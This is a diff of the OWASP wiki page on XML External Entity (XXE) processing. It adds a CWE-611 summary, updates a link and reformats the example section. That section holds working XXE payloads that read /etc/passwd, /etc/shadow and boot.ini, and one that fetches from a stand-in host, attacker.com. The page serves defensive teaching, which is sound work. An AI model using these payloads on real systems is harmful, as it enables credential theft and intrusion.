@@ -2,8 +2,8 @@
 
 layout: col-sidebar
 title: XML External Entity (XXE) Processing
-author: 
-contributors: 
+author:
+contributors:
 permalink: /vulnerabilities/XML_External_Entity_(XXE)_Processing
 tags: vulnerability, XML External Entity (XXE) Processing
 auto-migrated: 1
@@ -11,6 +11,10 @@ auto-migrated: 1
 ---
 
 {% include writers.html %}
+
+## NVD Categorization
+
+> [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html): The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.
 
 ## Description
 
@@ -70,7 +74,7 @@ through subdomain names to a DNS server that they controls.
 
 ## Examples
 
-The examples below are from [Testing for XML Injection (OWASP-DV-008)](Testing_for_XML_Injection_\(OWASP-DV-008\) "wikilink").
+The examples below are from [Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection).
 
 ### Accessing a local resource that may not return
 
@@ -102,34 +106,34 @@ get RCE. Let’s modify the payload
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <foo>&xxe;</foo>
 ```
 
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
 <foo>&xxe;</foo>
 ```
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
 <foo>&xxe;</foo>
 ```
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
 <foo>&xxe;</foo>
 ```
 
